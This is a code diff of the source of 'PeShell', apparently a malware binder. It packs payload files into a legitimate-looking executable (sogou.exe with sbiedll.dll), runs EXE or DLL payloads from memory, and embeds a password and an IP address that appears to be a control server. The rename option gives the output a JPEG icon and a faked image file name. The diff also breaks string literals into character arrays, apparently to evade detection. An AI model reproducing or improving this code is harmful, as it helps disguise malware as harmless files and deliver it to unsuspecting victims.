@@ -36,28 +36,26 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	if (argc < 3)
 	{
-		printf("example:PeShell -be sogou.exe sbiedll.dll c:\\users -c params.dat -o out.exe\r\n");
+		printf("example:PeShell -b sogou.exe sbiedll.dll -f c:\\users -c params.dat -o out.exe\r\n");
 
-		printf("example:PeShell -be sogou.exe sbiedll.dll c:\\users -p jy20200729 47.116.51.29 -o out.exe\r\n");
-
-		printf("example:PeShell -bd sogou.exe sbiedll.dll -c params.dat -o out.dll\r\n");
+		printf("example:PeShell -b sogou.exe sbiedll.dll -f c:\\users -p jy20200729 47.116.51.29 -o out.exe\r\n");
 
 		printf("example:PeShell -ber sogou.exe sbiedll.dll -c params.dat -o out.exe\r\n");
 
-		printf("example:PeShell -e sogou.exe -c params.dat -o out.exe\r\n");
+		printf("example:PeShell -re sogou.exe -c params.dat -o out.exe\r\n");
 
-		printf("example:PeShell -d sogou.exe -c params.dat -o out.dll\r\n");
+		printf("example:PeShell -rd sogou.dll -c params.dat -o out.dll\r\n");
 
 		printf("param error\r\n");
-		getchar();
+		ret = getchar();
 		return -1;
 	}
 
 	string curpath = Public::getCurPath();
 	ret = SetCurrentDirectoryA(curpath.c_str());
 
-	char filelist[MAX_FILE_COUNT][256];
-	memset(filelist, 0, MAX_FILE_COUNT * 256);
+	char filelist[MAX_FILE_COUNT][MAX_PATH];
+	memset(filelist, 0, MAX_FILE_COUNT * MAX_PATH);
 	int type = 0;
 	int paramscnt = 0;
 	char szoutFn[MAX_PATH] = { 0 };
@@ -66,72 +64,39 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	int bRename = FALSE;
 
-	int cpu_arch = 0;
+	int cpu_arch = PEParser::getPEArch((const char*)GetModuleHandleW(0));;
 
 	string outpath = "";
 
 	for (int i = 1; i < argc; )
 	{
-		if (lstrcmpiA(argv[i], "-be") == 0 || lstrcmpiA(argv[i], "-bd") == 0)
+		if (lstrcmpiA(argv[i], "-b") == 0 )
 		{
-			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
-
 			type = BIND_RELEASE_EXE;
 
-			int num = 2;
-			for (int j = i + 1, k = 0; k < num; j++, k++)
+			for (int j = i + 1; j < i+3; j++)
 			{
-				lstrcpyA(filelist[k], argv[j]);
+				lstrcpyA(filelist[paramscnt], argv[j]);
 				paramscnt++;
 			}
 
-			outpath = argv[i + paramscnt + 1];
-			i += num + 2;
+			i += 3;
 			continue;
 		}
-		else if (lstrcmpiA(argv[i], "-boe") == 0 || lstrcmpiA(argv[i], "-bod") == 0)
+		else if (lstrcmpiA(argv[i], "-re") == 0)
 		{
-			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
-
-			type = BIND_RELEASE_EXE;
-			int num = 1;
-			for (int j = i + 1, k = 0; k < num; j++, k++)
-			{
-				lstrcpyA(filelist[k], argv[j]);
-				paramscnt++;
-			}
-
-			outpath = argv[i + paramscnt + 1];
-			i += num + 2;
-			continue;
-		}
-		else if (lstrcmpiA(argv[i], "-dh") == 0 || lstrcmpiA(argv[i], "-eh") == 0)
-		{
-			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
-			type = BIND_RELEASE_EXE;
-			Crypto::cryptPayloadFile(argv[i + 1], TEMPLATE_TEMPORARY_FILENAME);
-			lstrcpyA(filelist[paramscnt], TEMPLATE_TEMPORARY_FILENAME);
-			paramscnt++;
-			i += 2;
-			continue;
-		}
-
-		else if (lstrcmpiA(argv[i], "-e") == 0)
-		{
-			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 			printf("argv[%i]:%s\r\n", i, argv[i + 1]);
 
 			type = MEM_RUN_EXE;
-			lstrcpyA(filelist[0], argv[i + 1]);
+			lstrcpyA(filelist[paramscnt], argv[i + 1]);
 			paramscnt++;
 			i += 2;
 			continue;
 		}
-		else if (lstrcmpiA(argv[i], "-d") == 0)
+		else if (lstrcmpiA(argv[i], "-rd") == 0)
 		{
-			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 			type = MEM_RUN_DLL;
-			lstrcpyA(filelist[0], argv[i + 1]);
+			lstrcpyA(filelist[paramscnt], argv[i + 1]);
 			paramscnt++;
 			i += 2;
 			continue;
@@ -139,6 +104,12 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		else if (lstrcmpiA(argv[i], "-o") == 0)
 		{
 			lstrcpyA(szoutFn, argv[i + 1]);
+			i += 2;
+			continue;
+		}
+		else if (lstrcmpiA(argv[i], "-f") == 0)
+		{
+			outpath = argv[i + 1];
 			i += 2;
 			continue;
 		}
@@ -156,12 +127,16 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 			lstrcpyA(filelist[paramscnt], CONFIG_FILENAME);
 			paramscnt++;
 
+			if (i + 2 > argc) {
+				printf("argument error\r\n");
+				return -1;
+			}
 			Public::prepareParams(argv[i + 1], argv[i + 2], CONFIG_FILENAME);
 
 			i += 3;
 			continue;
 		}
-		else if (lstrcmpiA(argv[i], "-r") == 0)
+		else if (lstrcmpiA(argv[i], "-rename") == 0)
 		{
 			bRename = TRUE;
 			i++;
@@ -172,12 +147,12 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	if (szoutFn[0] == 0)
 	{
-		lstrcpyA(szoutFn, "mytest.exe");
+		lstrcpyA(szoutFn, "OutTest.exe");
 	}
 	if (type == 0)
 	{
-		printf("command line something error\r\n");
-		getchar();
+		printf("command line something error!\r\n");
+		ret = getchar();
 		return -1;
 	}
 	if (cpu_arch == 0x014c)
@@ -189,17 +164,21 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, paramscnt,outpath, szoutFn);
 	if (resultfn == "")
 	{
-		printf("something error happened\r\n");
-		getchar();
+		printf("something error happened!\r\n");
+		ret = getchar();
 		return -1;
 	}
 
 	if (bRename) {
-		ChangeIcon(resultfn.c_str(), "jpg.ico");
-		FakeFilename::fakefn(resultfn, "jpeg", "香港之路");
+		char jpgico[] = { 'j','p','g','.','i','c','o',0 };
+		ChangeIcon(resultfn.c_str(), jpgico);
+		char jpg[] = { 'j','p','e','g',0 };
+		unsigned short ch[] = {'香','港','之','路',0};
+		string mystr = (char*)ch;
+		FakeFilename::fakefn(resultfn, jpg, mystr);
 	}
 
-	printf("pe bind type:%d cpu arch:%x work completed\r\n", type, cpu_arch);
+	printf("bind type:%d cpu arch:%x completed\r\n", type, cpu_arch);
 	ExitProcess(0);
 	return 0;
 }
